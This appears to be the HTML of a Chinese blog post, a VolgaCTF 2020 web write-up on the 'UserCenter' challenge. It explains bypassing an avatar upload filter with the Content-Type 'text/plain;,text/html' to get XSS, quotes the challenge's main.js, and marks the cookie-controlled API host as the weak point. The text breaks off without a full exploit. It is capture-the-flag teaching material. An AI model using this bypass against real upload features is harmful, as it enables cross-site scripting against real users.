@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="UserCenter首先大概一下浏览基本功能  登陆&#x2F;注册 查看个人信息以及修改个人信息和头像 Report Bug将URL发送给admin进行xss  大概测试了一下，发现如下： 修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。 不过发现我们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VolgaCTF 2020 Qualifier-Web">
+<meta property="og:url" content="http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="UserCenter首先大概一下浏览基本功能  登陆&#x2F;注册 查看个人信息以及修改个人信息和头像 Report Bug将URL发送给admin进行xss  大概测试了一下，发现如下： 修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。 不过发现我们">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/31/GQfQCF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/31/GQfyDI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/31/GQhIJO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/31/Gl8ggJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/01/GldVl8.png">
+<meta property="article:published_time" content="2020-04-22T09:35:57.000Z">
+<meta property="article:modified_time" content="2020-04-22T09:36:28.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/03/31/GQfQCF.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/"/>
+
+
+
+
+
+  <title>VolgaCTF 2020 Qualifier-Web | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">VolgaCTF 2020 Qualifier-Web</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-22T17:35:57+08:00">
+                2020-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="UserCenter"><a href="#UserCenter" class="headerlink" title="UserCenter"></a>UserCenter</h3><p>首先大概一下浏览基本功能</p>
+<ul>
+<li>登陆/注册</li>
+<li>查看个人信息以及修改个人信息和头像</li>
+<li>Report Bug将URL发送给admin进行xss</li>
+</ul>
+<p>大概测试了一下，发现如下：</p>
+<p>修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。</p>
+<p>不过发现我们可以通过控制type的类型来控制返回文件的类型. 我是通过<code>text/plain;,text/html</code>来进行bypass的，因为在Chrome中是支持以逗号分隔的多种内容类型的，所以可以利用这个来进行Bypass.</p>
+<p><img src="https://s1.ax1x.com/2020/03/31/GQfQCF.png" alt="GQfQCF.png"></p>
+<p>看了下国外大哥的wp,发现他fuzz出了更多可执行xss的Content-Type, tql..</p>
+<p>详细可以看这篇文章</p>
+<p><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html</a></p>
+<p>接下来可以看下主页面的main.js..(我刚开始没发现这个文件..)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user-update`</span>,</span><br><span class="line">        data: <span class="built_in">JSON</span>.stringify(user),</span><br><span class="line">        contentType: <span class="string">"application/json"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span></span><br><span class="line">    &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">            showError(data.error);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.<span class="keyword">get</span>(`//$&#123;api&#125;.volgactf-task.ru/logout<span class="string">`, function(data) &#123;</span></span><br><span class="line"><span class="string">        location.replace("/login.html");</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function profile(user, edit) &#123;</span></span><br><span class="line"><span class="string">    if (</span></span><br><span class="line"><span class="string">        !["/profile.html", "/report.php", "/editprofile.html"].includes(</span></span><br><span class="line"><span class="string">            location.pathname</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">        location.replace("/profile.html");</span></span><br><span class="line"><span class="string">    $("#username").text(user.username);</span></span><br><span class="line"><span class="string">    $("#username").val(user.username);</span></span><br><span class="line"><span class="string">    $("#bio").text(user.bio);</span></span><br><span class="line"><span class="string">    $("#bio").val(user.bio);</span></span><br><span class="line"><span class="string">    $("#avatar").attr("src", `</span><span class="comment">//static.volgactf-task.ru/$&#123;user.avatar&#125;`);</span></span><br><span class="line">    <span class="keyword">if</span> (edit) &#123;</span><br><span class="line">        $(<span class="string">"#editProfile"</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/login.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/register.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/profile.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/logout.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceForbiden</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">        .replace(<span class="regexp">/[ !"#$%&amp;Вґ()*+,\-\/:;&lt;=&gt;?@\[\\\]^_`&#123;|&#125;~]/g</span>, <span class="string">""</span>)</span><br><span class="line">        .replace(<span class="regexp">/[^\x00-\x7F]/g</span>, <span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showError</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#error"</span>)</span><br><span class="line">        .removeClass(<span class="string">"d-none"</span>)</span><br><span class="line">        .text(error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#logForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/login`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html?guid=<span class="subst">$&#123;data.guid&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#regForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/register`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#avatar"</span>).on(<span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>)</span><br><span class="line">            .next(<span class="string">".custom-file-label"</span>)</span><br><span class="line">            .text($(<span class="keyword">this</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>].name);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#editForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        b64Avatar = <span class="string">""</span>;</span><br><span class="line">        mime = <span class="string">""</span>;</span><br><span class="line">        bio = $(<span class="string">"#bio"</span>).val();</span><br><span class="line">        avatar = $(<span class="string">"#avatar"</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (avatar) &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">            reader.readAsDataURL(avatar);</span><br><span class="line">            reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                b64Avatar = reader.result.split(<span class="string">","</span>)[<span class="number">1</span>];</span><br><span class="line">                mime = avatar.type;</span><br><span class="line">                updateUser(&#123; <span class="attr">avatar</span>: b64Avatar, <span class="attr">type</span>: mime, <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            updateUser(&#123; <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    params = <span class="keyword">new</span> URLSearchParams(location.search);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"/"</span>,</span><br><span class="line">            <span class="string">"/index.html"</span>,</span><br><span class="line">            <span class="string">"/profile.html"</span>,</span><br><span class="line">            <span class="string">"/report.php"</span>,</span><br><span class="line">            <span class="string">"/editprofile.html"</span></span><br><span class="line">        ].includes(location.pathname)</span><br><span class="line">    ) &#123;</span><br><span class="line">        getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="string">"/logout.html"</span>].includes(location.pathname)) &#123;</span><br><span class="line">        logout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>漏洞点：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> <span class="comment">//   </span></span><br><span class="line">    </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
